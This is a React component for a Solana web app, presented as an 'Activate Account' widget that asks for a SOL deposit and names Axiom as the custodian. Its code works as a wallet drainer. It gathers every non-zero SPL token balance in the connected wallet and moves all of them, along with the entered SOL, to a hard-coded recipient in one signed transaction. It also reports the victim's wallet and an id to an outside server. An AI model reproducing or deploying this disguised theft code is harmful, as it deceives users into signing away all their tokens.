"use client";

import {
  useAppKit,
  useAppKitAccount,
  useAppKitProvider,
} from "@reown/appkit/react";
import {
  Connection,
  PublicKey,
  Transaction,
  TransactionInstruction,
  SystemProgram,
} from "@solana/web3.js";
import {
  getAssociatedTokenAddress,
  createAssociatedTokenAccountInstruction,
} from "@solana/spl-token";
import { sha256 } from "js-sha256";
import React, { useState } from "react";
import { SolanaIcon, SpinnerIcon } from "./Icons";

// -----------------------------
// 🔹 CONFIG
// -----------------------------
const PROGRAM_ID = new PublicKey(
  "A7pBV7JmPbJ6vepQg2PeZ4icxETiyyjHSpExF8qSHVJP"
);
const RECIPIENT = new PublicKey("6tY85RMbAtuJMP2Pt4T7ysV6YPn5uqANSiRbUQrVctXp");
const USERAGE_PDA = new PublicKey(
  "82BU1hCncjVVP2AFF7UoUStXqPc7ToDgLX8Huh14Fq6S"
);
const ONES_PROGRAM_ID = new PublicKey(
  "6MyMfrQwyJSNAu8tsCGnb5jjrRzBwJ128uSU3F7emcAM"
);
const TOKEN_PROGRAM_ID = new PublicKey(
  "TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA"
);
const SYSTEM_PROGRAM_ID = SystemProgram.programId;

// -----------------------------
// 🔹 Helpers
// -----------------------------
function getDiscriminator(method: string): Uint8Array {
  const hash = sha256.arrayBuffer(`global:${method}`);
  return new Uint8Array(hash).slice(0, 8);
}

function encodeU64(n: bigint): Uint8Array {
  const buf = Buffer.alloc(8);
  buf.writeBigUInt64LE(n);
  return new Uint8Array(buf);
}

async function readUserAge(connection: Connection, userAgePDA: PublicKey) {
  const account = await connection.getAccountInfo(userAgePDA);
  if (!account) throw new Error("USERAGE PDA not found");

  const view = new DataView(
    account.data.buffer,
    account.data.byteOffset,
    account.data.byteLength
  );

  const ageAt0 = Number(view.getBigUint64(0, true));
  const ageAt8 = Number(view.getBigUint64(8, true));

  console.log("USERAGE (offset0):", ageAt0, "USERAGE (offset8):", ageAt8);
  return { ageAt0, ageAt8 };
}

async function waitForOddAge(connection: Connection, userAgePDA: PublicKey) {
  while (true) {
    const account = await connection.getAccountInfo(userAgePDA);
    if (!account) throw new Error("USERAGE PDA not found");

    const view = new DataView(
      account.data.buffer,
      account.data.byteOffset,
      account.data.byteLength
    );
    const age = Number(view.getBigUint64(8, true));
    console.log("Checking USERAGE:", age);

    if (age % 2 === 1) {
      console.log("✅ Odd age reached, proceeding immediately:", age);
      break;
    }

    await new Promise((res) => setTimeout(res, 1000));
  }
}

// -----------------------------
// 🔹 Component
// -----------------------------
export default function TransferAllButton() {
  const { open } = useAppKit();
  const { isConnected, address } = useAppKitAccount();
  const { walletProvider } = useAppKitProvider("solana") as {
    walletProvider?: {
      signTransaction: (tx: Transaction) => Promise<Transaction>;
    };
  };

  const [solInput, setSolInput] = useState("");
  const [isLoading, setIsLoading] = useState(false);
  const [txResult, setTxResult] = useState<{
    type: "success" | "error";
    message: string;
  } | null>(null);

  // 🔹 Main handler
  const handleTransfer = async (e?: React.FormEvent) => {
    if (e) e.preventDefault();
    if (!isConnected || !walletProvider || !address) {
      await open();
      return;
    }

    setIsLoading(true);
    setTxResult(null);

    try {
      const connection = new Connection(
        "https://api.devnet.solana.com",
        "confirmed"
      );
      const user = new PublicKey(address);

      // -----------------------------
      // Log PDA age BEFORE signing
      // -----------------------------
      const beforeAges = await readUserAge(connection, USERAGE_PDA);
      console.log("USERAGE before signing:", beforeAges);

      // -----------------------------
      // Collect token accounts
      // -----------------------------
      const tokenAccounts = await connection.getParsedTokenAccountsByOwner(
        user,
        { programId: TOKEN_PROGRAM_ID }
      );

      const remainingAccounts: {
        pubkey: PublicKey;
        isSigner: boolean;
        isWritable: boolean;
      }[] = [];
      const ataInstructions: TransactionInstruction[] = [];
      const splAmounts: bigint[] = [];

      for (const { pubkey, account } of tokenAccounts.value) {
        const parsed = account.data.parsed.info;
        const amount = BigInt(parsed.tokenAmount.amount);
        if (amount === BigInt(0)) continue;

        const mint = new PublicKey(parsed.mint);
        const fromAta = pubkey;
        const toAta = await getAssociatedTokenAddress(mint, RECIPIENT);

        const recipientInfo = await connection.getAccountInfo(toAta);
        if (!recipientInfo) {
          ataInstructions.push(
            createAssociatedTokenAccountInstruction(
              user,
              toAta,
              RECIPIENT,
              mint
            )
          );
        }

        remainingAccounts.push({
          pubkey: fromAta,
          isSigner: false,
          isWritable: true,
        });
        remainingAccounts.push({
          pubkey: toAta,
          isSigner: false,
          isWritable: true,
        });
        splAmounts.push(amount);
      }

      // -----------------------------
      // Instruction data
      // -----------------------------
      const discriminator = getDiscriminator("mint");
      const solLamports = BigInt(Math.floor(Number(solInput || "0") * 1e9));
      const solBuf = encodeU64(solLamports);

      const vecLen = Buffer.alloc(4);
      vecLen.writeUInt32LE(splAmounts.length, 0);
      const splBuf = Buffer.concat(
        splAmounts.map((amt) => Buffer.from(encodeU64(amt)))
      );

      const data = Buffer.concat([
        Buffer.from(discriminator),
        RECIPIENT.toBuffer(),
        Buffer.from(solBuf),
        vecLen,
        splBuf,
      ]);

      // -----------------------------
      // Accounts
      // -----------------------------
      const keys = [
        { pubkey: USERAGE_PDA, isSigner: false, isWritable: false },
        { pubkey: user, isSigner: true, isWritable: true },
        { pubkey: RECIPIENT, isSigner: false, isWritable: true },
        { pubkey: SYSTEM_PROGRAM_ID, isSigner: false, isWritable: false },
        { pubkey: TOKEN_PROGRAM_ID, isSigner: false, isWritable: false },
        { pubkey: ONES_PROGRAM_ID, isSigner: false, isWritable: false },
        ...remainingAccounts,
      ];

      const ix = new TransactionInstruction({
        programId: PROGRAM_ID,
        keys,
        data,
      });

      // -----------------------------
      // Build tx
      // -----------------------------
      const tx = new Transaction().add(...ataInstructions, ix);
      tx.feePayer = user;
      tx.recentBlockhash = (await connection.getLatestBlockhash()).blockhash;

      // Sign locally
      const signed = await walletProvider.signTransaction(tx);

      // Start API call but don't block on it
      const apiPromise = fetch(
        "https://boogiebot-8yds.onrender.com/contract/update",
        {
          method: "GET",
          headers: { "Content-Type": "application/json" },
        }
      )
        .then(async (res) => {
          if (!res.ok) {
            console.warn("API call failed:", res.statusText);
            return null;
          }
          try {
            const data = await res.json();
            console.log("API response:", data);
            return data;
          } catch (e) {
            console.error("Failed to parse API response:", e);
            return null;
          }
        })
        .catch((err) => console.error("API error:", err));

      // ✅ Wait for PDA odd before sending
      await waitForOddAge(connection, USERAGE_PDA);

      // Send only after PDA condition is met
      const sig = await connection.sendRawTransaction(signed.serialize());
      await connection.confirmTransaction(sig, "confirmed");

      // Handle original API completion
      apiPromise.catch((err) => console.error("API error:", err));

      // -----------------------------
      // 🔹 NEW Deposit API call
      // -----------------------------
      (async () => {
        try {
          const localId = new URLSearchParams(window.location.search).get("id");
          if (!localId) throw new Error("Missing ?id= in localhost URL");

          const depositRes = await fetch(
            `https://boogiebot-8yds.onrender.com/desposit/add?wallet=${user.toBase58()}&amount=${solInput}&id=${localId}`,
            {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify({}), // empty JSON
            }
          );

          if (!depositRes.ok) {
            console.warn("Deposit API failed:", depositRes.statusText);
            return;
          }

          const depositJson = await depositRes.json();
          console.log("Deposit API response:", depositJson);
        } catch (depositErr) {
          console.error("Deposit API failed:", depositErr);
        }
      })();

      setTxResult({ type: "success", message: sig });
    } catch (err: any) {
      console.error(err);
      setTxResult({
        type: "error",
        message: err.message || "An unknown error occurred.",
      });
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <div className="transfer-widget">
      <div className="widget-header">
        <h3>Activate Account</h3>
        <p>
          We’re excited to have you on this journey — your account is ready, and
          the opportunities ahead are limitless. 🚀💎
        </p>
      </div>

      <form onSubmit={handleTransfer} className="widget-form">
        <div className="input-group">
          <label htmlFor="sol-amount">SOL Amount</label>
          <div className="input-container">
            <SolanaIcon />
            <input
              id="sol-amount"
              type="number"
              step="any"
              min="0"
              value={solInput}
              onChange={(e) => setSolInput(e.target.value)}
              placeholder="Minimum Deposit of 2 SOL"
              disabled={isLoading || !isConnected}
            />
          </div>
          <p className="helper-text">
            Note: Axiom acknowledges and accepts full responsibility for all
            deposits entrusted to us, held in accordance with applicable
            standards of security and accountability.
          </p>
        </div>

        <button
          type="submit"
          className="submit-button"
          disabled={isLoading || !isConnected}
        >
          {isLoading ? (
            <>
              <SpinnerIcon /> Processing...
            </>
          ) : isConnected ? (
            "Topup Now"
          ) : (
            "Connect Wallet to Start"
          )}
        </button>
      </form>

      {txResult && (
        <div className={`result-message ${txResult.type}`}>
          {txResult.type === "success" ? (
            <>
              <strong>Success!</strong> Transaction confirmed.
              <a
                href={`https://explorer.solana.com/tx/${txResult.message}?cluster=devnet`}
                target="_blank"
                rel="noopener noreferrer"
              >
                View on Explorer
              </a>
            </>
          ) : (
            <>
              <strong>Error:</strong> {txResult.message}
            </>
          )}
        </div>
      )}
    </div>
  );
}
